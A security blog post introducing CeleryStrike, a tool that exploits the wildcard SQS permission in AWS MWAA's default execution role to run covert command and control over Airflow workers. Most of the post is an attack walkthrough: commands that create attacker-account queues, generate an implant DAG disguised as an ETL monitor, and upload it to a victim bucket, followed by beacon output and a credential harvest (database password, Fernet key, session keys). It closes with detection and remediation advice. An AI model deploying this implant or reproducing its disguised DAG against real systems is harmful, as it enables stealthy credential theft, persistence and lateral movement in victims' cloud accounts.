---
date: 2026-02-16
authors:
  - been
categories:
  - Cloud Security
  - AWS
tags:
  - aws
  - mwaa
  - airflow
  - sqs
  - c2
  - iam
  - post-exploitation
  - lateral-movement
description: AWS MWAA ships with a mandatory IAM policy that allows SQS access to any account. We built CeleryStrike to exploit this for full C2 over Airflow workers — credential harvesting, cross-account recon, and arbitrary execution tunneled through legitimate Celery traffic.
---

# Weaponizing AWS MWAA's Default Execution Role: Full C2 Over Airflow Workers Via SQS

## TL;DR

AWS Managed Workflows for Apache Airflow (MWAA) ships with a **mandatory** IAM policy that grants the execution role `sqs:SendMessage` and `sqs:ReceiveMessage` to `arn:aws:sqs:*:*:airflow-celery-*` — any queue, in **any AWS account**, matching that prefix. This is not a misconfiguration; it's the [documented default](https://docs.aws.amazon.com/mwaa/latest/userguide/mwaa-create-role.html) required for the service to function. Tightening it breaks MWAA.

We built [CeleryStrike](https://github.com/AI-redteam/celerystrike), a tool that exploits this policy to establish a full command-and-control channel over Airflow workers. A single DAG upload gives an attacker an interactive implant with credential harvesting, cross-account recon, event injection, and arbitrary command execution — all tunneled through SQS queues that are indistinguishable from legitimate Celery traffic.

<img width="704" height="733" alt="Screenshot 2026-02-16 at 1 23 34 PM" src="https://github.com/user-attachments/assets/d48622bf-3774-47c9-abca-a0f5832ae973" />


This post walks through a live engagement against a real MWAA environment, from initial deployment to full credential harvest.

<!-- more -->

---

## Initial Access: Just Write to S3

The barrier to entry here is surprisingly low. The only thing an attacker needs to kick off this entire chain is **write access to the MWAA DAGs S3 bucket**. Drop a Python file into the `dags/` prefix, and Airflow's scheduler will automatically pick it up and start executing it. No Airflow UI access needed, no API tokens — just an S3 `PutObject`.

And here's the thing: broad S3 write access is *everywhere*. It's one of the most common over-permissions in AWS environments. Developer roles with `s3:PutObject` on `*`, CI/CD pipelines with blanket S3 access, cross-account roles scoped to `arn:aws:s3:::*` — any of these get you in. In most orgs I've tested, finding a principal that can write to the DAG bucket is the easy part. The hard part is usually convincing the client that their "low-risk" S3 permissions just gave an attacker a C2 implant inside their VPC.

MWAA doesn't have any built-in DAG validation or approval workflow. Whatever lands in that S3 prefix gets executed. That design decision turns every over-scoped S3 permission in the account into a potential path to full environment compromise.

---

## The Vulnerability

When you create an MWAA environment, AWS requires an execution role with the following SQS policy:

```json
{
  "Effect": "Allow",
  "Action": [
    "sqs:ChangeMessageVisibility",
    "sqs:DeleteMessage",
    "sqs:GetQueueAttributes",
    "sqs:GetQueueUrl",
    "sqs:ReceiveMessage",
    "sqs:SendMessage"
  ],
  "Resource": "arn:aws:sqs:*:*:airflow-celery-*"
}
```

The critical detail is the `*:*` in the resource ARN:

- First `*` = **any region**
- Second `*` = **any AWS account**

MWAA uses SQS queues in an AWS-managed account for Celery task distribution. Since customers don't know that account ID, AWS tells you to use a wildcard. The unintended consequence: the MWAA worker can now read from and write to any SQS queue named `airflow-celery-*` in **any AWS account in existence**.

This creates a bidirectional communication channel. An attacker creates two queues in their own account (`airflow-celery-c2-commands` and `airflow-celery-c2-results`), uploads a DAG that polls the command queue and writes results back, and suddenly has a full C2 implant running inside the victim's VPC.

### Why You Can't Just Fix the Policy

This is the mandatory configuration. Restricting the account ID wildcard or removing SQS actions will cause the MWAA scheduler to fail — workers will never receive tasks, and all DAG executions will hang indefinitely. Defenders have no IAM-based mitigation that doesn't break the service.

### AWS Knows About This

To their credit, AWS acknowledges this in the [execution role documentation](https://docs.aws.amazon.com/mwaa/latest/userguide/mwaa-create-role.html). Here's the note, verbatim:

> *If you have elected for Amazon MWAA to use an AWS owned KMS key to encrypt your data, then you must define permissions in a policy attached to your Amazon MWAA execution role that grant access to arbitrary KMS keys stored outside of your account through Amazon SQS. The following two conditions are required in order for your environment's execution role to access arbitrary KMS keys:*
>
> *A KMS key in a third-party account needs to allow this cross account access through its resource policy.*
>
> *Your DAG code needs to access an Amazon SQS queue that starts with `airflow-celery-` in the third-party account and uses the same KMS key for encryption.*
>
> ***To mitigate the risks associated with cross-account access to resources, we recommend reviewing the code placed in your DAGs** to ensure that your workflows are not accessing arbitrary Amazon SQS queues outside your account.*

Read that last line again. AWS's mitigation for a mandatory cross-account SQS policy is: *review your DAG code*. They're putting the burden entirely on the customer to ensure nobody uploads a malicious DAG — while providing no built-in mechanism to enforce it. No DAG approval workflow, no code signing, no runtime sandboxing. Just "review the code."

They also suggest using a customer-managed KMS key instead of the AWS-owned key, which limits the KMS cross-account surface. But that doesn't change the SQS policy — the `arn:aws:sqs:*:*:airflow-celery-*` wildcard is still there regardless of your encryption choice. And once you've created the environment, you can't change the encryption option.

---

## Attack Flow

```
                     ┌─────────────────────┐
                     │   Attacker Machine   │
                     │                      │
                     │   celerystrike       │
                     │   connect ...        │
                     └──────┬───────────────┘
                            │  SQS (airflow-celery-c2-*)
                ┌───────────┴───────────┐
                ▼                       ▼
      ┌─────────────────┐    ┌─────────────────┐
      │  Command Queue  │    │  Results Queue   │
      │  (attacker acct)│    │  (attacker acct) │
      └────────┬────────┘    └────────▲────────┘
               │  poll                │  send
               ▼                      │
      ┌────────────────────────────────┐
      │     MWAA Airflow Worker        │
      │                                │
      │  C2 Implant DAG                │
      │  ├── !harvest-creds            │
      │  ├── !airflow-dump             │
      │  ├── !s3-recon                 │
      │  ├── !secrets / !ssm-params    │
      │  ├── !recon (cross-account)    │
      │  ├── !inject (cross-account)   │
      │  ├── !dos-flood                │
      │  ├── !pivot / !multi           │
      │  └── shell / python:           │
      └────────────────────────────────┘
```

The implant DAG runs on a schedule (configurable, default every 2 minutes). Each run:
1. Sends a beacon with system info to the results queue
2. Polls the command queue for operator instructions
3. Executes any commands found (built-in modules, shell, or Python)
4. Returns results to the results queue

From the victim's perspective, all traffic is `sqs:SendMessage` / `sqs:ReceiveMessage` to queues matching `airflow-celery-*` — exactly what legitimate Celery workers do every few seconds.

---

## Live Walkthrough

The following demonstrates CeleryStrike against a real MWAA environment. All testing was conducted against our own infrastructure with proper authorization.

### Step 1: Deploy the Infrastructure

First, create the attacker-side SQS queues and generate the C2 implant DAG:

```bash
# Create C2 queues in the attacker's account with cross-account access policies
celerystrike deploy queues \
  --attacker-account <ATTACKER_ACCT_ID> \
  --attacker-profile <ATTACKER_PROFILE>

# Generate the implant DAG with stealth options
celerystrike deploy generate \
  --attacker-account <ATTACKER_ACCT_ID> \
  --attacker-profile <ATTACKER_PROFILE> \
  --stealth --poll-interval 2 --jitter 30 \
  --output-dir ./dags

# Upload the DAG to the target MWAA environment's S3 bucket
celerystrike deploy upload \
  --file ./dags/dag_c2_implant.py \
  --target-bucket <MWAA_DAG_BUCKET> \
  --target-prefix dags/ \
  --target-profile <VICTIM_PROFILE>
```

With `--stealth`, the DAG is named `etl_celery_task_monitor` and tagged `["etl", "monitoring"]` — it looks like a routine ETL health check in the Airflow UI. The `--jitter 30` flag adds up to 30 seconds of random delay to each run, making the polling pattern less regular.

The `deploy all` command can do all three steps in one shot, but the step-by-step approach is useful when the S3 upload path is separate from your tooling (e.g., uploading via a compromised CI/CD pipeline).

### Step 2: Connect to the Implant

```bash
celerystrike connect \
  --attacker-account <ATTACKER_ACCT_ID> \
  --attacker-profile <ATTACKER_PROFILE>
```

Within two minutes, the first beacon arrives:

```
c2> !results
  [i] Polling for results...

  ════════════════════════════════════════════════════════════════
  BEACON from ip-10.x.x.x.ec2.internal @ 2026-02-16T18:00:18
  ════════════════════════════════════════════════════════════════
    User:     airflow
    Platform: Linux-5.10.xxx-xxx.amzn2.x86_64-x86_64-with-glibc2.34
    Python:   3.11.9
    PID:      479
    CWD:      /usr/local/airflow
    Modules:  !harvest-creds, !airflow-dump, !s3-recon, !secrets,
              !ssm-params, !iam-enum, !network-recon, !self-destruct,
              !read-file, !write-file, !pivot, !recon, !inject,
              !dos-flood, !multi, python:<code>
  ════════════════════════════════════════════════════════════════
```

The beacon confirms the implant is alive on an EC2 instance inside the MWAA VPC, running as the `airflow` user on Amazon Linux 2 with Python 3.11. We now have full interactive access.

### Step 3: Harvest Credentials

The `!exfil` command triggers all collection modules at once:

```
c2> !exfil
  [i] Sending batch: !harvest-creds, !airflow-dump, !s3-recon,
      !secrets, !ssm-params
  [+] Commands queued.
```

After the next DAG run, we drain results:

```
c2> !drain
  [i] Draining all pending results...
```

#### Credential Harvest (`!harvest-creds`)

The harvest reveals the full environment variable dump from the worker process. Here's what we found (redacted):

```json
{
  "sts_identity": {
    "UserId": "AROA...:AmazonMWAA-airflow",
    "Account": "<VICTIM_ACCT_ID>",
    "Arn": "arn:aws:sts::<VICTIM_ACCT_ID>:assumed-role/<EXEC_ROLE>/AmazonMWAA-airflow"
  },
  "env_vars": {
    "MWAA__DB__CREDENTIALS": "{\"password\":\"<REDACTED>\",\"username\":\"adminuser\"}",
    "DB_SECRETS": "{\"password\":\"<REDACTED>\",\"username\":\"adminuser\"}",
    "MWAA__CORE__FERNET_KEY": "{\"FernetKey\":\"<REDACTED>\"}",
    "FERNET_SECRET": "{\"FernetKey\":\"<REDACTED>\"}",
    "POSTGRES_DB": "AirflowMetadata",
    "RDS_IAM_TOKEN_HOSTNAME": "<ENV_ID>.proxy-<PROXY_ID>.us-east-1.rds.amazonaws.com",
    "AIRFLOW__CELERY__BROKER_URL": "sqs://sqs.us-east-1.amazonaws.com",
    "AIRFLOW__CELERY__RESULT_BACKEND": "db+postgresql+psycopg2://adminuser:<REDACTED>@<RDS_ENDPOINT>:5432/AirflowMetadata",
    "AIRFLOW_ENV_ID": "<ENVIRONMENT_UUID>",
    "MWAA__CORE__API_SERVER_URL": "https://<ENV_ID>.airflow.us-east-1.on.aws",
    "AWS_CONTAINER_CREDENTIALS_RELATIVE_URI": "/v2/credentials/<CREDENTIAL_ID>",
    "AWS_DEFAULT_REGION": "us-east-1"
  },
  "container_credentials": {
    "AccessKeyId": "ASIA...<REDACTED>",
    "SecretAccessKey": "<REDACTED>",
    "Token": "<REDACTED>",
    "Expiration": "2026-02-16T19:05:51Z"
  }
}
```

**What we got from a single command:**

| Data | Impact |
|------|--------|
| **RDS database credentials** (`adminuser` / password) | Direct access to the Airflow metadata database containing all DAG run history, task states, and connection objects |
| **Fernet encryption key** | Can decrypt all Airflow connection passwords and variable secrets stored in the metadata DB |
| **PostgreSQL connection string** | Full `psycopg2://` URI with embedded credentials to the RDS proxy endpoint |
| **AWS session credentials** | Temporary `ASIA*` access keys for the execution role — usable from outside the VPC |
| **Container credential endpoint** | The ECS credential vending path, refreshable for as long as the task runs |
| **Airflow API server URL** | The internal/external Airflow webserver endpoint |
| **CloudWatch log group ARNs** | Log groups for Scheduler, Worker, Task, WebServer, and DAGProcessing |

The Fernet key is especially devastating: Airflow encrypts all connection passwords and sensitive variables at rest using this key. With it, an attacker can decrypt every stored credential in the metadata database — database passwords, API keys, cloud credentials — everything teams have stored in Airflow Connections.

#### Airflow Configuration Dump (`!airflow-dump`)

```json
{
  "connections": [],
  "variables": [],
  "pools": [
    {
      "pool": "default_pool",
      "slots": 128,
      "description": "Default pool"
    }
  ]
}
```

This test environment had no configured connections, but in a production MWAA deployment, this command would return every Airflow Connection object — including database URIs with embedded passwords, API keys, and OAuth tokens for every external system Airflow integrates with.

#### IAM Enumeration (`!iam-enum`)

```json
{
  "sts_identity": {
    "UserId": "AROA...:AmazonMWAA-airflow",
    "Account": "<VICTIM_ACCT_ID>",
    "Arn": "arn:aws:sts::<VICTIM_ACCT_ID>:assumed-role/<EXEC_ROLE>/AmazonMWAA-airflow"
  },
  "assumed_role": "<EXEC_ROLE>",
  "role_details_error": "User: ...is not authorized to perform: iam:GetRole on resource: role <EXEC_ROLE>",
  "attached_policies_error": "User: ...is not authorized to perform: iam:ListAttachedRolePolicies",
  "inline_policies_error": "User: ...is not authorized to perform: iam:ListRolePolicies"
}
```

The execution role doesn't have IAM read permissions (expected for a well-scoped role), but we've already confirmed the role name and can map its permissions by testing each action.

#### Network Reconnaissance (`!network-recon`)

```json
{
  "interfaces": ["eth0: 10.x.x.x/24"],
  "routes": ["default via 10.x.x.1 dev eth0"],
  "tcp_connections": ["10.x.x.x:xxxxx -> 10.x.x.x:5432 ESTABLISHED", "..."],
  "vpcs_error": "User: ...is not authorized to perform: ec2:DescribeVpcs",
  "subnets_error": "User: ...is not authorized to perform: ec2:DescribeSubnets",
  "security_groups_error": "User: ...is not authorized to perform: ec2:DescribeSecurityGroups"
}
```

The raw `/proc/net/tcp` dump reveals all active TCP connections from the worker — including connections to the RDS database (port 5432), the SQS endpoints, and internal AWS service endpoints. Even without EC2 describe permissions, the network state gives us a partial map of the VPC topology.

---

## What An Attacker Can Do From Here

With the data harvested in under 5 minutes, an attacker now has:

### Immediate Access
- **Airflow metadata database**: Using the harvested RDS credentials and the Fernet key to decrypt stored secrets
- **AWS API access**: Using the temporary session credentials from outside the VPC
- **All Airflow connections**: Any database, API, or service Airflow is configured to talk to

### Persistent Access
- The C2 implant continues running on schedule, surviving worker restarts
- Container credentials auto-refresh, providing continuous AWS API access
- The implant can be used to upload additional DAGs or modify existing ones

### Lateral Movement
- `!recon` can scan other AWS accounts for MWAA environments
- `!inject` can send crafted payloads to queues in other accounts
- `!pivot` enables cross-account message routing
- Shell and Python execution allow arbitrary operations within the VPC

### Stealth
- All C2 traffic uses SQS API calls that are identical to legitimate Celery worker traffic
- The DAG appears as a routine monitoring job in the Airflow UI
- No unusual network connections — SQS is an expected destination for MWAA workers
- CloudTrail logs show `sqs:SendMessage` / `sqs:ReceiveMessage` — the same actions every MWAA worker generates constantly

---

## Detection Guidance

CeleryStrike includes a `analyze` module for blue teams:

```bash
# Scan a specific execution role for the vulnerable policy
celerystrike analyze role --role-name AmazonMWAA-MyEnv-ExecutionRole

# Enumerate all MWAA environments and check their roles
celerystrike analyze full --region us-east-1 --profile security-audit

# Generate detection rules (CloudWatch Insights queries + AWS Config rules)
celerystrike analyze detection-rules --output-dir ./detection_rules
```

### What To Look For

1. **SQS API calls to unknown account IDs**: The MWAA worker should only communicate with AWS-managed queues. Any `sqs:SendMessage` or `sqs:ReceiveMessage` to a different account is suspicious.

2. **New DAGs appearing in S3**: Monitor the DAG bucket for unexpected file uploads, especially files that import `boto3` and reference SQS.

3. **Unusual DAG scheduling patterns**: Legitimate DAGs typically run on business schedules. A DAG running every 1-2 minutes with jitter is a red flag.

4. **CloudTrail anomalies**: Look for `sqs:GetQueueUrl` calls with `QueueOwnerAWSAccountId` set to accounts you don't recognize — this is the recon module probing for targets.

---

## Remediation

Since tightening the IAM policy breaks MWAA, defenders must rely on compensating controls:

1. **Restrict DAG upload access**: The S3 bucket is the only attack surface. Use strict bucket policies, enable versioning, and alert on any non-CI/CD uploads.

2. **Enable S3 object-level CloudTrail logging**: Log every `PutObject` to the DAG bucket.

3. **DAG code review**: Implement pre-upload scanning for suspicious patterns (`boto3.client("sqs")`, cross-account queue URLs, subprocess calls).

4. **SQS VPC Endpoints with policies**: Restrict which SQS queues can be accessed from the MWAA VPC using VPC endpoint policies — this is the closest thing to a network-level fix.

5. **CloudTrail monitoring**: Alert on SQS API calls from the MWAA execution role that target account IDs outside your organization.

6. **Runtime monitoring**: Deploy GuardDuty and monitor for anomalous API activity from the execution role.

---

*CeleryStrike is available at [github.com/AI-redteam/celerystrike](https://github.com/AI-redteam/celerystrike).*
